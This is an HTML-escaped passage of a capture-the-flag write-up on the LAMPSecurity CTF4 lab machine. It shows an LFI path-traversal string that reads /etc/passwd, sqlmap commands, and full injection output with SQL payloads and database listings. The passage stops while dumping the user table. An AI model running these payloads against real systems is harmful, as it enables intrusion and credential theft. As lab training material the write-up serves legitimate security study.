  &lt;p&gt;The LAMPSecurity series is not particularly challenging, for each VM in the series I've targeted the &lt;b&gt;web application&lt;/b&gt; as the entry point.&lt;/p&gt;
&lt;/div&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 22&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;SSH&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;OpenSSH 4.3 (protocol 2.0)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 25&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;SMTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Sendmail 8.13.5/8.13.5&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTPD&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.2.0 ((Fedora))&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;http-enumeration&quot;&gt;HTTP Enumeration&lt;/h3&gt;

&lt;p&gt;Inspection of the Web Application revealed the blog used GET requests.&lt;/p&gt;

&lt;h4 id=&quot;lfi-exploit&quot;&gt;LFI Exploit&lt;/h4&gt;

&lt;p&gt;The string &lt;code&gt;index.html?page=../../../../../../etc/passwd%00&lt;/code&gt; exposed the contents on the unix passwd file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf4/LFI.png&quot; alt=&quot;OWASP DirBuster&quot; /&gt;&lt;/p&gt;

&lt;p&gt;RFI did not appear possible.&lt;/p&gt;

&lt;h2 id=&quot;sqlmap-enumeration&quot;&gt;SQLMap Enumeration&lt;/h2&gt;

&lt;p&gt;SQLMap was leveraged to enumerate, inject and dump the MySQL databases on the target.&lt;/p&gt;

&lt;h3 id=&quot;sqlmap&quot;&gt;SQLMap&lt;/h3&gt;

&lt;p&gt;Using the GET ‘id’ as the injection point, the following SQLMap command was used to successfully list tables for all databases on the target system.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.30.147/index.html?page=blog&amp;amp;title=Blog&amp;amp;id=2&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--tables&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Full SQLMap Command Output:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;_
___ ___| |_____ ___ ___  &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1.0-dev-nongit-0826&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
|_ -| &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; | |     | .&lt;span class=&quot;s1&quot;&gt;'| . |
|___|_  |_|_|_|_|__,|  _|
|_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'&lt;/span&gt;s responsibility to obey all applicable &lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;, state and federal laws. Developers assume no liability and are not responsible &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;any misuse or damage caused by this program

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; starting at 12:05:38

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:38] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing connection to the target URL
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:38] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;the target URL is stable
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:39] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] target URL is stable
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:39] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] heuristic &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;basic&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;shows that GET parameter &lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt; might be injectable &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;possible DBMS: &lt;span class=&quot;s1&quot;&gt;'MySQL'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:39] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;SQL injection on GET parameter &lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;
it looks like the back-end DBMS is &lt;span class=&quot;s1&quot;&gt;'MySQL'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Do you want to skip &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;payloads specific &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;other DBMSes? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y/n] Y
&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the remaining tests, &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to include all tests &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'MySQL'&lt;/span&gt; extending provided level &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and risk &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; values? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y/n] Y
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'AND boolean-based blind - WHERE or HAVING clause'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] GET parameter &lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt; seems to be &lt;span class=&quot;s1&quot;&gt;'AND boolean-based blind - WHERE or HAVING clause'&lt;/span&gt; injectable
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.5 OR error-based - WHERE, HAVING clause (BIGINT UNSIGNED)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 4.1 OR error-based - WHERE, HAVING clause'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL OR error-based - WHERE or HAVING clause'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.0 error-based - Parameter replace'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.1 error-based - Parameter replace (UPDATEXML)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL inline queries'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt; 5.0.11 stacked queries (SELECT - comment)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] time-based comparison requires larger statistical model, please wait....                                                                                         
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt; 5.0.11 stacked queries (SELECT)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt; 5.0.11 stacked queries (comment)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt; 5.0.11 stacked queries'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;lt; 5.0.12 stacked queries (heavy query - comment)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;lt; 5.0.12 stacked queries (heavy query)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:05:57] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:06:08] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] GET parameter &lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt; seems to be &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT)'&lt;/span&gt; injectable
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:06:08] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'Generic UNION query (NULL) - 1 to 20 columns'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:06:08] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] automatically extending ranges &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UNION query injection technique tests as there is at least one other &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;potential&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; technique found
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:06:08] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] ORDER BY technique seems to be usable. This should reduce the &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;needed to find the right number of query columns. Automatically extending the range &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;current UNION query injection technique &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:06:08] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] target URL appears to have 5 columns &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;query
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:06:08] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] GET parameter &lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt; is &lt;span class=&quot;s1&quot;&gt;'Generic UNION query (NULL) - 1 to 20 columns'&lt;/span&gt; injectable
GET parameter &lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt; is vulnerable. Do you want to keep testing the others &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;any&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;y/N] N
sqlmap identified the following injection point&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with a total of 45 HTTP&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; requests:
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
Parameter: &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GET&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: &lt;span class=&quot;nv&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;blog&amp;amp;title&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Blog&amp;amp;id&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2 AND &lt;span class=&quot;nv&quot;&gt;7114&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7114

Type: AND/OR time-based blind
Title: MySQL &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; 5.0.12 AND time-based blind &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SELECT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Payload: &lt;span class=&quot;nv&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;blog&amp;amp;title&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Blog&amp;amp;id&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2 AND &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SELECT &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; FROM &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SELECT&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SLEEP&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;kOtW&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Type: UNION query
Title: Generic UNION query &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NULL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - 5 columns
Payload: &lt;span class=&quot;nv&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;blog&amp;amp;title&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Blog&amp;amp;id&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2 UNION ALL SELECT NULL,NULL,NULL,CONCAT&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7162707871,0x4f75614351414f4d6e69,0x7176717671&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,NULL--
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:06:31] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] the back-end DBMS is MySQL
web server operating system: Linux Fedora 5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Bordeaux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
web application technology: Apache 2.2.0, PHP 5.1.2
back-end DBMS: MySQL 5.0.12
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:06:31] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] fetching database names
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:06:31] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] fetching tables &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;databases: &lt;span class=&quot;s1&quot;&gt;'calendar, ehks, information_schema, mysql, roundcubemail, test'&lt;/span&gt;
Database: calendar
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;5 tables]
+---------------------------------------+
| phpc_calendars                        |
| phpc_events                           |
| phpc_sequence                         |
| phpc_users                            |
| uid                                   |
+---------------------------------------+

Database: roundcubemail
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;6 tables]
+---------------------------------------+
| session                               |
| cache                                 |
| contacts                              |
| identities                            |
| messages                              |
| &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;                                 |
+---------------------------------------+

Database: ehks
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3 tables]
+---------------------------------------+
| user                                  |
| blog                                  |
| comment                               |
+---------------------------------------+

Database: information_schema
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;16 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| KEY_COLUMN_USAGE                      |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| STATISTICS                            |
| TABLES                                |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+

Database: mysql
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;17 tables]
+---------------------------------------+
| user                                  |
| columns_priv                          |
| db                                    |
| func                                  |
| help_category                         |
| help_keyword                          |
| help_relation                         |
| help_topic                            |
| host                                  |
| proc                                  |
| procs_priv                            |
| tables_priv                           |
| time_zone                             |
| time_zone_leap_second                 |
| time_zone_name                        |
| time_zone_transition                  |
| time_zone_transition_type             |
+---------------------------------------+&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;sqlmap-dump-hahes--crack-hashes&quot;&gt;SQLMap Dump Hahes + Crack hashes&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.30.147/index.html?page=blog&amp;amp;title=Blog&amp;amp;id=2&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; ehks &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; user  &lt;span class=&quot;nt&quot;&gt;--dump&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;_
___ ___| |_____ ___ ___  &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1.0-dev-nongit-0826&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
|_ -| &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; | |     | .&lt;span class=&quot;s1&quot;&gt;'| . |
|___|_  |_|_|_|_|__,|  _|
|_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'&lt;/span&gt;s responsibility to obey all applicable &lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;, state and federal laws. Developers assume no liability and are not responsible &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;any misuse or damage caused by this program

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; starting at 12:15:25

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:25] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] resuming back-end DBMS &lt;span class=&quot;s1&quot;&gt;'mysql'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:25] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing connection to the target URL
sqlmap resumed the following injection point&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; from stored session:
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
Parameter: &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GET&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: &lt;span class=&quot;nv&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;blog&amp;amp;title&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Blog&amp;amp;id&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2 AND &lt;span class=&quot;nv&quot;&gt;7114&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7114

Type: AND/OR time-based blind
Title: MySQL &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; 5.0.12 AND time-based blind &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SELECT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Payload: &lt;span class=&quot;nv&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;blog&amp;amp;title&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Blog&amp;amp;id&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2 AND &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SELECT &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; FROM &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SELECT&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SLEEP&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;kOtW&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Type: UNION query
Title: Generic UNION query &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NULL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - 5 columns
Payload: &lt;span class=&quot;nv&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;blog&amp;amp;title&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Blog&amp;amp;id&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2 UNION ALL SELECT NULL,NULL,NULL,CONCAT&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7162707871,0x4f75614351414f4d6e69,0x7176717671&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,NULL--
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:25] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] the back-end DBMS is MySQL
web server operating system: Linux Fedora 5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Bordeaux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
web application technology: Apache 2.2.0, PHP 5.1.2
back-end DBMS: MySQL 5.0.12
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:15:25] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] fetching columns &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;table &lt;span class=&quot;s1&quot;&gt;'user'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;database &lt;span class=&quot;s1&quot;&gt;'ehks'&lt;/span&gt;
